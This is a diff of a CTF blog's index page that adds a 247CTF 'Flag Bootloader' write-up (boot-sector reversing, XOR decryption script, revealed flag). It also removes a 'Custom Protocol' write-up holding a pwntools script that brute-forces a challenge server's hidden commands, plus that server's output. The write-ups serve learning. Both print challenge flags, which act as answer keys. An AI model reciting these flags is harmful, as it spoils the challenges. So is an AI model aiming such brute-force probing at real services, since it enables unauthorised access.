@@ -236,7 +236,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -274,6 +274,150 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-flag-bootloader/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/247CTF/247CTF-the-flag-bootloader/" class="post-title-link" itemprop="url">247CTF - The Flag Bootloader</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-06 13:10:58 / Modified: 14:01:32" itemprop="dateCreated datePublished" datetime="2026-03-06T13:10:58+08:00">2026-03-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/247CTF/247CTF-the-flag-bootloader/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-flag-bootloader/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Can you unlock the secret boot sequence hidden within our flag
+bootloader to recover the flag?</p>
+</blockquote>
+<h2 id="analysis">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ file flag.com</span><br><span class="line">flag.com: DOS/MBR boot sector</span><br></pre></td></tr></table></figure>
+<p>This is a 512-byte boot sector image. Using <code>xxd</code> to view
+the hex data:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000: eb21 b800 10cd 16c3 60b4 0e8a 043c 0074  .!......`....&lt;.t</span><br><span class="line">00000010: 0eb7 00b3 07cd 1080 fe24 7403 46eb ec61  .........$t.F..a</span><br><span class="line">...</span><br><span class="line">000001f0: 0000 0000 0000 0000 0000 0000 0000 55aa  ..............U.</span><br></pre></td></tr></table></figure>
+<p>The <code>55 aa</code> signature at the end confirms it is a standard
+boot sector.</p>
+<h2 id="boot-sector-fundamentals">Boot Sector Fundamentals</h2>
+<p>When a computer powers on and completes the Power-On Self-Test
+(POST), the BIOS reads the first sector (512 bytes) of the disk into
+physical memory between <strong><code>0x7C00</code> and
+<code>0x7DFF</code></strong>. It then sets the CPU’s Instruction Pointer
+(IP) to <code>0x7C00</code> to begin execution.</p>
+<p>Therefore, the <strong>base address</strong> of this program in
+memory is <strong><code>0x7C00</code></strong>. When performing static
+analysis or debugging, any hardcoded physical addresses must have
+<code>0x7C00</code> subtracted to find their corresponding file
+offset.</p>
+<h2 id="static-analysis-and-memory-mapping">Static Analysis and Memory
+Mapping</h2>
+<p>Analyzing the assembly code reveals two critical memory
+locations:</p>
+<h3 id="flag-ciphertext-area-0x7daa">1. Flag Ciphertext Area
+(<code>0x7DAA</code>)</h3>
+<p>Calculate the file offset: <span
+class="math display">0<em>x</em>7<em>D</em><em>A</em><em>A</em> − 0<em>x</em>7<em>C</em>00 = 0<em>x</em>01<em>A</em><em>A</em></span>
+Looking at the hex dump at <code>0x01AA</code>: <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000001a0: 6420 636f 6465 210a 0d00 3234 3743 5446  d code!...247CTF</span><br></pre></td></tr></table></figure> The
+ciphertext indeed begins here, with the first 7 bytes representing the
+<code>247CTF&#123;</code> prefix.</p>
+<h3 id="input-buffer-0x7dec">2. Input Buffer (<code>0x7DEC</code>)</h3>
+<p>Calculate the file offset: <span
+class="math display">0<em>x</em>7<em>D</em><em>E</em><em>C</em> − 0<em>x</em>7<em>C</em>00 = 0<em>x</em>01<em>E</em><em>C</em></span>
+The region of null bytes before the <code>55 aa</code> signature is used
+directly as a buffer for keyboard input.</p>
+<h2 id="core-logic-deconstruction">Core Logic Deconstruction</h2>
+<p>Focusing on <code>sub_1016A</code> in IDA (the primary decryption
+logic):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">seg000:016B  mov  bx, 7DECh      ; BX points to the input buffer</span><br><span class="line">seg000:016E  mov  si, 7DAAh      ; SI points to the start of the ciphertext</span><br><span class="line">seg000:0171  add  si, 7          ; Skip &quot;247CTF&#123;&quot;</span><br><span class="line"></span><br><span class="line">; Validate the first input character and decrypt</span><br><span class="line">seg000:0174  mov  al, 4Bh        ; &#x27;K&#x27;</span><br><span class="line">seg000:0176  xor  al, 0Ch        ; AL = 0x4B ^ 0x0C = 0x47 (&#x27;G&#x27;)</span><br><span class="line">seg000:0178  cmp  [bx], al       ; Check if input[0] == &#x27;G&#x27;</span><br><span class="line">seg000:017A  jnz  loc_1027C      ; Jump to failure if not equal</span><br><span class="line"></span><br><span class="line">; Decrypt ciphertext using the validated char in AL</span><br><span class="line">seg000:017E  xor  [si], al       ; XOR decryption</span><br><span class="line">seg000:0180  inc  si</span><br><span class="line">seg000:0181  xor  [si], al       ; Each input char decrypts TWO bytes</span><br><span class="line">seg000:0183  inc  bx</span><br><span class="line">seg000:0184  inc  si</span><br></pre></td></tr></table></figure>
+<p><strong>Logic Summary:</strong> 1. The program requires a
+16-character unlock code. 2. Each character is validated via
+arithmetic/logical operations (XOR, ADD, SUB). 3. Validated characters
+serve as XOR keys to decrypt the subsequent ciphertext region. 4. Each
+key character decrypts 2 bytes of ciphertext.</p>
+<h2 id="solution-script">Solution Script</h2>
+<p>We can simulate the assembly operations to recover the unlock code
+and then use it to XOR the ciphertext bytes.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. Recover the 16-character unlock code</span></span><br><span class="line">    unlock_chars = [</span><br><span class="line">        <span class="number">0x4B</span> ^ <span class="number">0x0C</span>, <span class="number">0x53</span> ^ <span class="number">0x06</span>, <span class="number">0x58</span> - <span class="number">0x01</span>, <span class="number">0x62</span> - <span class="number">0x29</span>,</span><br><span class="line">        <span class="number">0x68</span> ^ <span class="number">0x23</span>, <span class="number">0x4B</span> ^ <span class="number">0x00</span>, <span class="number">0x62</span> - <span class="number">0x1E</span>, <span class="number">0x4D</span> - <span class="number">0x0B</span>,</span><br><span class="line">        <span class="number">0x45</span> ^ <span class="number">0x0D</span>, <span class="number">0x10</span> ^ <span class="number">0x28</span>, <span class="number">0x58</span> ^ <span class="number">0x1D</span>, <span class="number">0x7A</span> ^ <span class="number">0x28</span>,</span><br><span class="line">        <span class="number">0x65</span> - <span class="number">0x13</span>, <span class="number">0x33</span> ^ <span class="number">0x07</span>, <span class="number">0x25</span> ^ <span class="number">0x15</span>, <span class="number">0x4C</span> + <span class="number">0x0C</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    unlock_code = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> unlock_chars)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Unlock Code: <span class="subst">&#123;unlock_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Extract encrypted payload (32 bytes from offset 0x1B1)</span></span><br><span class="line">    <span class="comment"># This corresponds to memory 0x7DB1 (0x7DAA + 7)</span></span><br><span class="line">    payload_hex = <span class="string">&quot;77 21 67 30 60 35 0c 0c 78 79 2e 2e 20 72 70 75 29 2b 00 5c 21 70 62 63 65 60 07 0d 06 02 3b 3b&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytes</span>.fromhex(payload_hex)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. Perform XOR decryption</span></span><br><span class="line">    decrypted_chars = []</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted_bytes):</span><br><span class="line">        key = unlock_chars[i // <span class="number">2</span>]</span><br><span class="line">        decrypted_chars.append(<span class="built_in">chr</span>(byte ^ key))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: 247CTF&#123;&#123;<span class="subst">&#123; <span class="string">&#x27;&#x27;</span>.join(decrypted_chars) &#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{0f2e7b5532eed627ac8dd501723962cc}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1488,146 +1632,6 @@ bitwise operation behavior.</li>
 </ul>
 <h2 id="flag">Flag</h2>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{17594c670da74613e921faed37d37fd8}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-custom-protocol-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-custom-protocol-writeup/" class="post-title-link" itemprop="url">247CTF - Custom Protocol Writeup</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-01 15:08:40" itemprop="dateCreated datePublished" datetime="2026-03-01T15:08:40+08:00">2026-03-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-custom-protocol-writeup/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-custom-protocol-writeup/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>We are working on our own custom command and control protocol. Can
-you identify any hidden features in the service? We also included a
-packet capture of some old sessions so you can learn how it works.</p>
-<p>我们正在开发自己的自定义命令与控制协议。您能发现该服务中有哪些隐藏功能吗？我们还提供了一些旧会话的数据包捕获文件，以便您了解其工作原理。</p>
-<h3 id="pcap-investigation-with-scapy">PCAP Investigation with
-Scapy</h3>
-<p>The first step was to examine the provided packet capture
-(<code>custom_protocol_log.pcap</code>) to understand the communication
-pattern. I used <code>scapy</code> to extract and decode raw data from
-the TCP streams.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> TCP</span><br><span class="line"></span><br><span class="line">PCAP_FILE = <span class="string">&quot;custom_protocol_log.pcap&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_hex</span>(<span class="params">pcap_path</span>):</span><br><span class="line">    packets = rdpcap(pcap_path)</span><br><span class="line">    <span class="keyword">for</span> pkt <span class="keyword">in</span> packets:</span><br><span class="line">        <span class="keyword">if</span> TCP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt.haslayer(Raw):</span><br><span class="line">            raw = pkt[Raw].load</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Attempt to decode or print as hex</span></span><br><span class="line">                <span class="built_in">print</span>(raw.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    print_hex(PCAP_FILE)</span><br></pre></td></tr></table></figure>
-<h3 id="protocol-reversal">Protocol Reversal</h3>
-<p>By analyzing the hex data from the traffic between
-<code>172.17.0.1</code> and <code>172.17.0.2</code>, a clear pattern
-emerged:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b925afc1 00 31 00 30 00 323430323435313235</span><br><span class="line">b925afc1 00 32 00 30 00 323032383630353038</span><br><span class="line">b925afc1 00 33 00 32 00 33383232383038323633</span><br></pre></td></tr></table></figure>
-<p>The protocol structure appears to be:
-<code>[Session ID] [Null] [Counter] [Null] [Command] [Null] [Checksum]</code></p>
-<ul>
-<li><strong>Session ID</strong>: A 4-byte identifier (e.g.,
-<code>b925afc1</code>).</li>
-<li><strong>Counter</strong>: Increments with each request.</li>
-<li><strong>Command</strong>: Hex-encoded numbers (e.g., <code>30</code>
-for <code>0</code>, <code>31</code> for <code>1</code>, <code>32</code>
-for <code>2</code>).</li>
-<li><strong>Checksum</strong>: A CRC32 calculation of the preceding
-bytes, where the result is converted to a decimal string and then
-hex-encoded.</li>
-</ul>
-<h4 id="checksum-verification">Checksum Verification</h4>
-<p>Using Python to verify the CRC32 logic:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_custom_crc_hex</span>(<span class="params">hex_data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    data_bytes = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line">    crc_val = zlib.crc32(data_bytes)</span><br><span class="line">    <span class="comment"># Convert CRC32 integer to decimal string, then hex-encode that string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(crc_val).encode().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">base_hex = <span class="string">&quot;b925afc100310030&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Payload: <span class="subst">&#123;base_hex&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Custom CRC Hex: <span class="subst">&#123;calc_custom_crc_hex(base_hex)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># Output: 323430323435313235 (Matches the PCAP!)</span></span><br></pre></td></tr></table></figure>
-<h2 id="solution">Solution</h2>
-<h3 id="exploit-script">Exploit Script</h3>
-<p>I developed a brute-force script using <code>pwntools</code> to
-iterate through potential commands (<code>0-14</code>) and find the one
-that triggers the flag response.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;35f9359cc67c7983.247ctf.com&quot;</span></span><br><span class="line">PORT = <span class="number">50385</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_custom_crc_hex</span>(<span class="params">hex_data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    data_bytes = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line">    crc_val = zlib.crc32(data_bytes)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(crc_val).encode().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    sep = <span class="string">&quot;00&quot;</span></span><br><span class="line">    counter = <span class="string">&quot;31&quot;</span></span><br><span class="line">    <span class="comment"># Commands 0-14 in hex format</span></span><br><span class="line">    commands = [<span class="string">f&quot;3<span class="subst">&#123;<span class="built_in">hex</span>(i)[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> cmd <span class="keyword">in</span> commands:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = remote(HOST, PORT, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="comment"># Receive Session ID</span></span><br><span class="line">            session_id = conn.recvline(drop=<span class="literal">True</span>).decode(errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">            log.info(<span class="string">f&quot;Session ID: <span class="subst">&#123;session_id&#125;</span> | Testing Command: <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Construct payload: [SessionID][00][Counter][00][Command][00][Checksum]</span></span><br><span class="line">            base_hex = <span class="string">f&quot;<span class="subst">&#123;session_id&#125;</span><span class="subst">&#123;sep&#125;</span><span class="subst">&#123;counter&#125;</span><span class="subst">&#123;sep&#125;</span><span class="subst">&#123;cmd&#125;</span>&quot;</span></span><br><span class="line">            crc_hex = calc_custom_crc_hex(base_hex)</span><br><span class="line">            payload = <span class="string">f&quot;<span class="subst">&#123;base_hex&#125;</span><span class="subst">&#123;sep&#125;</span><span class="subst">&#123;crc_hex&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            conn.sendline(payload.encode())</span><br><span class="line"></span><br><span class="line">            raw_response = conn.recvall(timeout=<span class="number">3</span>).decode(errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Server returns hex-encoded response</span></span><br><span class="line">                decoded_response = <span class="built_in">bytes</span>.fromhex(raw_response).decode(errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;247CTF&quot;</span> <span class="keyword">in</span> decoded_response:</span><br><span class="line">                    log.success(<span class="string">f&quot;Flag found: <span class="subst">&#123;decoded_response&#125;</span>&quot;</span>)</span><br><span class="line">                    conn.close()</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                log.warning(<span class="string">f&quot;Failed to decode hex response: <span class="subst">&#123;raw_response&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
-<h3 id="execution-output">Execution Output</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[*] Starting brute-force with commands: [<span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;31&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;3a&#x27;</span>, <span class="string">&#x27;3b&#x27;</span>, <span class="string">&#x27;3c&#x27;</span>, <span class="string">&#x27;3d&#x27;</span>, <span class="string">&#x27;3e&#x27;</span>]</span><br><span class="line">[+] Opening connection to 35f9359cc67c7983.247ctf.com on port 50385: Done</span><br><span class="line">[*] Session ID: 9b2832a1</span><br><span class="line">[+] Receiving all data: Done (54B)</span><br><span class="line">[*] Closed connection to 35f9359cc67c7983.247ctf.com port 50385</span><br><span class="line">[*] Response: (2\x001\x00notroot</span><br><span class="line">    \x003738085711</span><br><span class="line">----------------------------------------</span><br><span class="line">[*] Connection closed.</span><br><span class="line">[+] Opening connection to 35f9359cc67c7983.247ctf.com on port 50385: Done</span><br><span class="line">[*] Session ID: 3907e672</span><br><span class="line">[+] Receiving all data: Done (152B)</span><br><span class="line">[*] Closed connection to 35f9359cc67c7983.247ctf.com port 50385</span><br><span class="line">[*] Response: 9\x07r\x001\x00uid=1000(notroot) gid=1000(notroot) <span class="built_in">groups</span>=1000(notroot)</span><br><span class="line">    \x003051696603</span><br><span class="line">----------------------------------------</span><br><span class="line">[*] Connection closed.</span><br><span class="line">[+] Opening connection to 35f9359cc67c7983.247ctf.com on port 50385: Done</span><br><span class="line">[*] Session ID: edd0a465</span><br><span class="line">[+] Receiving all data: Done (96B)</span><br><span class="line">[*] Closed connection to 35f9359cc67c7983.247ctf.com port 50385</span><br><span class="line">[*] Response: Фe\x001\x00Sun Mar  1 06:57:51 UTC 2026</span><br><span class="line">    \x003480231763</span><br><span class="line">----------------------------------------</span><br><span class="line">[*] Connection closed.</span><br><span class="line">[+] Opening connection to 35f9359cc67c7983.247ctf.com on port 50385: Done</span><br><span class="line">[*] Session ID: 705136bc</span><br><span class="line">[+] Receiving all data: Done (446B)</span><br><span class="line">[*] Closed connection to 35f9359cc67c7983.247ctf.com port 50385</span><br><span class="line">[*] Response: pQ6\x001\x00              total        used        free      shared  buff/cache   available</span><br><span class="line">    Mem:        7973384     1587756     3913000        2636     2472628     6135804</span><br><span class="line">    Swap:       2097148           0     2097148</span><br><span class="line">    \x002165499562</span><br><span class="line">----------------------------------------</span><br><span class="line">[*] Connection closed.</span><br><span class="line">[+] Opening connection to 35f9359cc67c7983.247ctf.com on port 50385: Done</span><br><span class="line">[*] Session ID: d0f8fe01</span><br><span class="line">[+] Receiving all data: Done (118B)</span><br><span class="line">[*] Closed connection to 35f9359cc67c7983.247ctf.com port 50385</span><br><span class="line">[*] Response: \x01\x001\x00247CTF&#123;e5df2a6497c8733e8dc4679d856591af&#125;\x001655731160</span><br><span class="line">[+] Flag found: \x01\x001\x00247CTF&#123;e5df2a6497c8733e8dc4679d856591af&#125;\x001655731160</span><br><span class="line">[*] Connection closed.</span><br><span class="line"></span><br><span class="line">[Process exited 0]</span><br></pre></td></tr></table></figure>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{e5df2a6497c8733e8dc4679d856591af}</span></span>
 
       
     </div>
